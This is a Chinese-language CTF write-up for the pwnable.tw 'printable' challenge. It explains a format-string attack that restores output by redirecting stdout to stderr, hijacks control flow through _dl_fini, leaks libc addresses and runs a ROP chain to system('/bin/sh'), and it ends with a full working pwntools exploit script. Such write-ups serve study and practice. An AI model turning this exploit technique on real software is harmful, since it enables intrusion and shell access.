# pwnable.tw-printable

根据pwnable.tw的规则，对于题解较少的题目不公开wp。

<!--more-->

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**main**

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init_proc(argc, argv, envp);
  memset(s, 0, 0x80uLL);
  printf("Input :");
  close(1);
  read(0, s, 0x80uLL);
  printf(s);
  exit(0);
}
```

明显的格式化字符串漏洞，但是这里关闭了`stdout`。

首先，想办法进行leak，虽然关闭了`stdout`，但是我们可以修改其在bss段的FILE指针，使其指向`stderr`，这样就恢复了输出功能。

接着，输出是在第二次printf后才能显示的，所以要想办法进行二次利用，这里有一个很重要的点，在栈上残留着一个`ld.so`的指针：

```shell
pwndbg> p _rtld_global._dl_ns[0]._ns_loaded
$1 = (struct link_map *) 0x7ffff7ffe168
```

在exit的时候会执行dl_fini函数，里面有一段比较有趣的片段

```
<_dl_fini+819>: call   QWORD PTR [r12+rdx*8]
```

rdx固定为0，r12来自下面的代码片段

```
<_dl_fini+777>: mov    r12,QWORD PTR [rax+0x8]
<_dl_fini+781>: mov    rax,QWORD PTR [rbx+0x120]
<_dl_fini+788>: add    r12,QWORD PTR [rbx]
```

rbx指向的刚好就是栈上残留的ld.so的地址，因此我们可以控制[rbx]的值。r12默认指向的是fini_array，通过控制rbx，我们可以让r12指向bss，也就是我们可以劫持控制流了。

这段程序的源码，代码来自：/glibc/glibc-2.23/elf/dl-fini.c:128

```c
internal_function
_dl_fini (void)
{
  ...
  ElfW(Addr) *array =
    (ElfW(Addr) *) (l->l_addr
        + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
        / sizeof (ElfW(Addr)));
  while (i-- > 0)
    ((fini_t) array[i]) ();
  ...
}
```

其中变量`l`就是我们的`_rtld_global._dl_ns[0]._ns_loaded`，原本`l->l_addr`为0，则`array`的值就是正常的，但是`l->l_addr`不为0的话则会使其发生偏移，我们则可以使其直接偏移到`bss`段上，使其直接运行`bss`段的地址，也即是`buf`，则我们就控制了程序流。

再次回到main的read函数，就可以利用格式化字符串泄露栈和libc的地址，这里发现，栈上有一个地址指向了`printf`的返回地址，我们修改其低字节，其实返回到main中的read处，就可以实现第三次利用。

第三次利用，采取的方式是向栈上写一个`system("/bin/sh\x00")`的rop片段，然后覆盖返回地址为四个pop，最后使程序跳转到rop上。（这个部分的调试非常的麻烦

## exp

```python
from pwn import *

context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))

bss = 0x601000
stdout = 0x601020
pop4 = 0x4009bc
pop_rdi = 0x4009c3

while True:
    p = remote('chall.pwnable.tw',10307)
    # p = process(binary,env={'LD_PRELOAD':'./libc_64.so.6'})

    payload = '%{}c%42$n'.format(0x248)
    payload+= '%{}c%14$n'.format(0x925-0x248)+'%{}c%15$hhn'.format(0x40-0x25)
    payload+= '%16$hhn'+'%{}c%17$hhn'.format(0x45-0x40)
    payload = payload.ljust(0x40,b'\x00')
    payload+= p64(bss)+p64(bss+2)+p64(stdout)+p64(stdout+1)
    p.sendafter('Input :',payload.ljust(0x80,b'\x00'))

    payload = '%23$p%60$p'+'%{}c%23$hn'.format((0x925)-(14*2))
    p.send(payload)
    try:
        res = p.recv(0x1000)
        if b'Segmentation fault' in res:
            p.close()
        else:
            leaks = res[:28].split(b'0x')[1:]
            break
    except:
        p.close()

stack_addr = int(leaks[0],16)+0x8
libc_addr = int(leaks[1],16)
libc_base = libc_addr-(0x20740+240)
system = libc_base+0x45390
binsh = libc_base+0x18c177
leak('stack ',stack_addr)
leak('libc base',libc_base)

payload = '%24$n'+'%{}c%21$hn'.format(0x925)+'%{}c%22$hn'.format(0x9bc-0x925)
payload+= '%{}c%23$hhn'.format(0x40-0xbc+0x100)

payload = payload.ljust(0x40,b'\x00')
payload+= p64(stack_addr-0x8)+p64(stack_addr+0x20)+p64(stack_addr+0x22)+p64(stack_addr+0x23)
p.send(payload.ljust(0x80,b'\x00'))

payload = '%{}c%18$hn'.format(0x9bc).ljust(0xc,b'\x01')+b'EOF\x00'
payload+= p64(pop_rdi)+p64(binsh)+p64(system)+p64(stack_addr-0x8)
p.send(payload.ljust(0x80,b'\x00'))

p.recvuntil('EOF')
p.interactive()
```

